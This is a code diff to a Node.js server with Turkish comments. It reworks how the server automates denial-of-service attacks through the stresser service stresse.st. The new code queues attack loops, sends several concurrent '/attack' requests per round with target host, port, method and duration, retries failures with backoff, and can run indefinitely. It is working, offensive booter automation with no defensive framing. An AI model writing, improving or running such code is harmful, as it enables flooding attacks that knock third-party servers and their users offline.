@@ -79,6 +79,14 @@ const sessions = {};
 // Active loop registry: { loopId: { running, params, startedAt, lastRoundAt, roundCount, errors, roundAttackIds } }
 const activeLoops = {};
 
+// Global loop scheduler: ayni anda sadece 1 loop turu calissin,
+// loop'lar arasinda 5 saniye gecikme olsun (ilk biten ilk baslar).
+let loopQueue = [];
+let isProcessingLoopQueue = false;
+let activeLoopRoundCount = 0;
+const LOOP_QUEUE_DELAY_MS = 5000;
+const MAX_REQUEST_RETRIES = 3;
+
 // Active normal attacks registry: { attackId: { username, host, port, method, time, startedAt, expiresAt } }
 const activeAttacks = {};
 
@@ -977,111 +985,164 @@ async function runLoop(loopId) {
     return;
   }
 
+  // Loop'u global kuyruga ekle; scheduler sirasi geldiginde calistiracak.
+  if (!loopQueue.includes(loopId)) {
+    loopQueue.push(loopId);
+    console.log(`[loop ${loopId}] kuyruga eklendi. Sira: ${loopQueue.length}`);
+  }
+  processLoopQueue();
+}
+
+async function processLoopQueue() {
+  if (isProcessingLoopQueue) return;
+  isProcessingLoopQueue = true;
+
+  while (loopQueue.length > 0) {
+    // Ayni anda sadece 1 loop turu calissin; aktif tur varsa bekle
+    if (activeLoopRoundCount > 0) {
+      await new Promise(r => setTimeout(r, 500));
+      continue;
+    }
+
+    const loopId = loopQueue.shift();
+    const loop = activeLoops[loopId];
+    if (!loop || !loop.running) continue;
+
+    // Kuyrukta baska loop varsa (bu son degilse), loop'lar arasi 5 saniye bekle.
+    // Tek loop varsa bekleme olmaz.
+    if (loopQueue.length > 0) {
+      console.log(`[scheduler] ${loopId} icin ${LOOP_QUEUE_DELAY_MS}ms bekleniyor (kuyrukta ${loopQueue.length} loop daha var)`);
+      await new Promise(r => setTimeout(r, LOOP_QUEUE_DELAY_MS));
+    }
+
+    activeLoopRoundCount++;
+    console.log(`[scheduler] ${loopId} turu baslatiliyor`);
+    runLoopRound(loopId).finally(() => {
+      activeLoopRoundCount--;
+      // Tur bittikten sonra loop hala calisiyorsa kuyrugun sonuna ekle
+      if (activeLoops[loopId]?.running) {
+        if (!loopQueue.includes(loopId)) {
+          loopQueue.push(loopId);
+          console.log(`[loop ${loopId}] tur tamamlandi, kuyruga geri eklendi`);
+        }
+      } else {
+        cleanupLoop(loopId);
+      }
+      // Scheduler'i tekrar calistir
+      processLoopQueue();
+    });
+  }
+
+  isProcessingLoopQueue = false;
+}
+
+async function runLoopRound(loopId) {
+  const loop = activeLoops[loopId];
+  if (!loop || !loop.running) return;
+
   const client = getClient(loop.sessionId);
   let csrfToken = await fetchCsrfToken(client, loopId);
   if (!csrfToken) {
-    activeLoops[loopId].running = false;
-    activeLoops[loopId].errors += 1;
+    loop.errors += 1;
+    console.error(`[loop ${loopId}] CSRF token alinamadi, tur atlandi`);
     saveState();
     return;
   }
 
-  let consecutiveErrors = 0;
+  loop.roundCount += 1;
+  loop.lastRoundAt = new Date().toISOString();
+  const round = loop.roundCount;
 
-  while (activeLoops[loopId] && activeLoops[loopId].running) {
-    const currentLoop = activeLoops[loopId];
-    if (!currentLoop) break;
-    currentLoop.roundCount += 1;
-    currentLoop.lastRoundAt = new Date().toISOString();
-
-    const round = currentLoop.roundCount;
-
-    // Her 5 turda bir veya onceki tur hataliysa CSRF token'i tazeleyelim
-    if (round % 5 === 0 || consecutiveErrors > 0) {
-      const freshToken = await fetchCsrfToken(client, loopId);
-      if (freshToken) csrfToken = freshToken;
-    }
-
-    const attackPayload = {
-      host: currentLoop.params.layer === 'L7' ? normalizeUrl(currentLoop.params.host) : normalizeHost(currentLoop.params.host),
-      port: currentLoop.params.port,
-      time: currentLoop.params.time.toString(),
-      method: currentLoop.params.method,
-      subnet: currentLoop.params.subnet,
-      geo: currentLoop.params.geo
-    };
-    const attackHeaders = {
-      'Content-Type': 'application/json',
-      'X-CSRF-Token': csrfToken
-    };
-
-    // Her yeni turda once onceki tur ID'lerini temizle
-    currentLoop.roundAttackIds = [];
-
-    // Concurrent'lari ayni anda gonder ki stresse.st hepsi ayni zaman diliminde baslasin
-    let roundSuccesses = 0;
-    const roundAttacks = [];
-    for (let c = 0; c < currentLoop.params.concurrents; c++) {
-      roundAttacks.push(
-        client.post('/attack', attackPayload, { headers: attackHeaders })
-          .then((res) => {
-            const attackId = res.data?.id || res.data?.attack_id;
-            if (attackId) {
-              currentLoop.roundAttackIds.push(attackId);
-              roundSuccesses++;
-              // Loop attack'lerini de normal saldirilar gibi kaydet ki restart sonrasi gorunsun
-              registerAttack(attackId, loop.sessionId, currentLoop.params, loopId);
-            } else {
-              currentLoop.errors += 1;
-            }
-            return res;
-          })
-          .catch((err) => {
-            currentLoop.errors += 1;
-            console.error(`[loop ${loopId}] round ${round} concurrent ${c + 1} hata:`, err.message);
-          })
-      );
-    }
-    await Promise.all(roundAttacks);
-    saveState();
-
-    // Ardışık hata kontrolü: bir turda hiç başarılı saldırı yoksa sayaç artar
-    if (roundSuccesses === 0) {
-      consecutiveErrors++;
-      console.warn(`[loop ${loopId}] round ${round} tamamen basarisiz (${consecutiveErrors}/${MAX_LOOP_CONSECUTIVE_ERRORS})`);
-      if (consecutiveErrors >= MAX_LOOP_CONSECUTIVE_ERRORS) {
-        console.error(`[loop ${loopId}] Cok fazla hata, loop otomatik durduruluyor`);
-        activeLoops[loopId].running = false;
-        break;
-      }
-    } else {
-      consecutiveErrors = 0;
-    }
-
-    // Sonsuz loop degilse bir set calistir ve bitir
-    if (!currentLoop.params.infinite) {
-      currentLoop.running = false;
-      break;
-    }
-
-    // Bir sonraki set icin bekle: time kadar (stresse.st zaten time sn saldiri yapar) + interval
-    const waitTime = (currentLoop.params.time + currentLoop.params.interval) * 1000;
-    const startWait = Date.now();
-    while (activeLoops[loopId] && activeLoops[loopId].running && Date.now() - startWait < waitTime) {
-      await new Promise(r => setTimeout(r, 500));
-    }
+  // Her 5 turda bir CSRF token'i tazeleyelim
+  if (round % 5 === 0) {
+    const freshToken = await fetchCsrfToken(client, loopId);
+    if (freshToken) csrfToken = freshToken;
   }
 
-  // Loop bittiginde veya durduruldugunda kaydi sil ki listede kalmasin
+  const attackPayload = {
+    host: loop.params.layer === 'L7' ? normalizeUrl(loop.params.host) : normalizeHost(loop.params.host),
+    port: loop.params.port,
+    time: loop.params.time.toString(),
+    method: loop.params.method,
+    subnet: loop.params.subnet,
+    geo: loop.params.geo
+  };
+  const attackHeaders = {
+    'Content-Type': 'application/json',
+    'X-CSRF-Token': csrfToken
+  };
+
+  // Her yeni turda once onceki tur ID'lerini temizle
+  loop.roundAttackIds = [];
+
+  // Concurrent'lari ayni anda gonder; basarisiz olanlari retry et
+  let roundSuccesses = 0;
+  const roundAttacks = [];
+  for (let c = 0; c < loop.params.concurrents; c++) {
+    roundAttacks.push(
+      (async () => {
+        for (let attempt = 0; attempt <= MAX_REQUEST_RETRIES; attempt++) {
+          try {
+            const res = await client.post('/attack', attackPayload, { headers: attackHeaders });
+            const attackId = res.data?.id || res.data?.attack_id;
+            if (attackId) {
+              loop.roundAttackIds.push(attackId);
+              roundSuccesses++;
+              // Loop attack'lerini de normal saldirilar gibi kaydet ki restart sonrasi gorunsun
+              registerAttack(attackId, loop.sessionId, loop.params, loopId);
+              return res;
+            }
+            // Basarili HTTP ama attackId yoksa retry etme, direkt hata say
+            loop.errors += 1;
+            console.warn(`[loop ${loopId}] round ${round} concurrent ${c + 1} attackId donmedi`);
+            return res;
+          } catch (err) {
+            if (attempt === MAX_REQUEST_RETRIES) {
+              loop.errors += 1;
+              console.error(`[loop ${loopId}] round ${round} concurrent ${c + 1} hata (${MAX_REQUEST_RETRIES} retry):`, err.message);
+              return null;
+            }
+            // Exponential backoff: 500ms, 1000ms, 1500ms
+            await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
+          }
+        }
+      })()
+    );
+  }
+  await Promise.all(roundAttacks);
+
+  // Her loop'un kendi ardisik hata sayacini takip et (roundlar arasi kalici)
+  if (!loop.consecutiveErrors) loop.consecutiveErrors = 0;
+
+  if (roundSuccesses === 0) {
+    loop.consecutiveErrors++;
+    console.warn(`[loop ${loopId}] round ${round} tamamen basarisiz (${loop.consecutiveErrors}/${MAX_LOOP_CONSECUTIVE_ERRORS})`);
+    if (loop.consecutiveErrors >= MAX_LOOP_CONSECUTIVE_ERRORS) {
+      console.error(`[loop ${loopId}] Cok fazla hata, loop otomatik durduruluyor`);
+      loop.running = false;
+    }
+  } else {
+    loop.consecutiveErrors = 0;
+  }
+
+  // Sonsuz loop degilse bu tek turdu, loop'u durdur
+  if (!loop.params.infinite) {
+    loop.running = false;
+  }
+
+  saveState();
+}
+
+function cleanupLoop(loopId) {
   const finishedLoop = activeLoops[loopId];
   if (finishedLoop?.historyId && attackHistory[finishedLoop.historyId]) {
-    // Eger zaten durduruldu olarak isaretlenmemisse tamamlandi olarak isaretle
     if (attackHistory[finishedLoop.historyId].status === 'active') {
       updateAttackHistoryStatus(finishedLoop.historyId, 'completed');
     }
   }
   delete activeLoops[loopId];
   saveState();
+  console.log(`[loop ${loopId}] temizlendi`);
 }
 
 /**
